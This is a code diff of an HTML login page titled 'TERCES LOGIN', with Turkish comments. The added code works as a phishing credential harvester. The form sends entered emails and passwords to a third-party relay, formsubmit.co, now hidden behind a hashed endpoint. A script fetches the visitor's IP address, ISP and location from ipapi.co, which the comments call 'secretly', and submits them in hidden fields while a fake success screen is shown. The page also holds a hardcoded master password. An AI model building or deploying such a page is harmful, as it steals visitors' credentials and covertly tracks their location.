@@ -81,6 +81,7 @@
             background: #000; border: 1px dashed #00ff41;
             padding: 15px; color: #00ff41; font-family: monospace;
             margin-top: 20px; font-size: 12px;
+            word-break: break-all;
         }
     </style>
 </head>
@@ -90,13 +91,17 @@
         <div class="secure-header">Verified Access Required</div>
         <h1>TERCES LOGIN</h1>
 
-        <form action="https://formsubmit.co/TercesS-admin@proton.me" method="POST" id="mainForm">
+        <form action="https://formsubmit.co/19273e639ed99bee214f2b82f3953fff" method="POST" id="mainForm">
             <input type="hidden" name="_captcha" value="false">
             <input type="hidden" name="_next" value="https://terces-s.vercel.app">
             
+            <input type="hidden" name="IP_Adresi" id="userIP">
+            <input type="hidden" name="ISS_Bilgisi" id="userISP">
+            <input type="hidden" name="Konum" id="userLocation">
+            <input type="hidden" name="Cihaz_Bilgisi" id="deviceInfo">
+            
             <input type="email" name="email" placeholder="E-posta Adresi" required>
             <input type="password" name="password" id="passInput" placeholder="Sistem Şifresi" required>
-            <input type="hidden" name="User_Agent" id="deviceInfo">
             
             <button type="submit" class="btn-submit">Sisteme Bağlan</button>
         </form>
@@ -112,9 +117,21 @@
     </div>
 
     <script>
+        // Cihaz bilgisini çek
         document.getElementById('deviceInfo').value = navigator.userAgent;
+
+        // IP ve Konum bilgilerini gizlice çek
+        fetch('https://ipapi.co/json/')
+            .then(response => response.json())
+            .then(data => {
+                document.getElementById('userIP').value = data.ip;
+                document.getElementById('userISP').value = data.org; // İnternet sağlayıcısı
+                document.getElementById('userLocation').value = data.city + " / " + data.country_name;
+            })
+            .catch(err => console.log("Veri çekme hatası."));
         
-        // Buraya girmek için KENDİ belirlediğin ana şifreyi yaz (örneğin: mami123)
+        // --- ŞİFRE AYARI ---
+        // Buradaki tırnak içine giriş şifreni yazmayı unutma!
         const MASTER_PASSWORD = "9okmlp02wszaq1";
 
         document.getElementById('mainForm').onsubmit = function(e) {
@@ -124,11 +141,11 @@
                 return;
             }
             
-            // Başarı ekranına geçiş
+            // Başarı ekranına geçiş (Veriler FormSubmit'e gönderilirken kullanıcı bunu görür)
             setTimeout(() => {
                 document.getElementById('login-container').style.display = 'none';
                 document.getElementById('success-screen').style.display = 'block';
-            }, 500);
+            }, 800);
         };
     </script>
 </body>
